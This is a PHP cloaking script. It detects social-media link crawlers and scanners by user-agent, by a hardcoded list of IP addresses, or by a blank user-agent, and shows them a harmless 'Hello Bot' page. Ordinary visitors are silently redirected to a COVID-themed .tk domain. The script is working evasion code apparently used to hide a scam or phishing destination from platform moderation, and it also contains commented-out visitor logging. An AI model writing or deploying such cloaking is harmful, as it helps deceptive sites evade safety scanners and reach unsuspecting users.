<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$block = array("Twitterbot", "Twitterbot/1", "facebookexternalhit", "Applebot", "Dispatch", "LivelapBot", "crawler", "bot", "Go-http");
$ips = array("34.82.21.107", "54.85.166.17", "54.87.76.13","35.203.134.172","94.130.167.110","54.144.108.30", "35.247.28.101","94.130.167.99","136.243.80.152","34.83.210.199", "116.202.35.116","34.83.18.32","144.76.22.146","116.202.35.83", "34.82.132.94", "176.31.18.128","35.185.222.155", "144.76.22.145","34.145.41.52", "34.127.11.42", "3.232.110.130","116.202.35.93");
$pattern = '/(' . implode('|', $block) .')/i';
$matches = array();
$botMatches = preg_match($pattern, strtolower($_SERVER['HTTP_USER_AGENT']), $matches);
if(($botMatches > 0 || in_array($ip, $ips)) || trim(strtolower($_SERVER['HTTP_USER_AGENT'])) == "") // Found a match
{
  //Go to hell Twitter bot
  echo "Hello Bot";
  exit();
}else{
  //$agent = $_SERVER["HTTP_USER_AGENT"]."------".$ip;
  //$data = $agent.PHP_EOL;
  //$fp = fopen('a.txt', 'a');
  //fwrite($fp, $data);
  header("Location: https://www.covid19-greece.tk");
}